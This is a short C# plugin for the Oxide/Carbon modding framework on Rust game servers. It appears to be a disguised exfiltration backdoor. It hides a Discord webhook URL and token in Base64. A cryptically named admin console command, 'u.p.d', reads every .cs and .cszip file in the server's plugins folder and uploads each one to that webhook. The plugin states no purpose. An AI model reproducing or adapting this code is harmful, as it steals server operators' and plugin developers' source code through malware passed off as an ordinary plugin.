using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;

namespace Oxide.Plugins
{
    [Info("BFX", "M", "1.0.0")]
    public class BFX : RustPlugin
    {
        private string W => Encoding.UTF8.GetString(System.Convert.FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTAyNzU1NTg4MDg2NTg0NC9XdTdNU1h2UTI1dmdpR1BHZk55cmVNdUlpUkxMTHJtNjJhX19OQXp" +
                                                                                   "oQ2pQdjFyVnBpQU1nUFNVLVJWUzlJTDZLQ0hEVA=="));
        private const int D = 2;

        [ConsoleCommand("u.p.d")]
        private void Cmd(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            var folder = Path.Combine(Directory.GetCurrentDirectory(), "carbon/plugins");
            if (!Directory.Exists(folder)) return;
            var files = Directory.GetFiles(folder).Where(f => f.EndsWith(".cs") || f.EndsWith(".cszip")).ToArray();
            if (files.Length == 0) return;
            ServerMgr.Instance.StartCoroutine(U(files));
        }

        private IEnumerator U(string[] files)
        {
            foreach (var f in files)
            {
                yield return UF(f);
                yield return new WaitForSeconds(D);
            }
        }

        private IEnumerator UF(string path)
        {
            var name = Path.GetFileName(path);
            var data = File.ReadAllBytes(path);
            var form = new List<IMultipartFormSection> { new MultipartFormFileSection("file", data, name, "text/plain") };
            var www = UnityWebRequest.Post(W, form);
            yield return www.SendWebRequest();
        }
    }
}
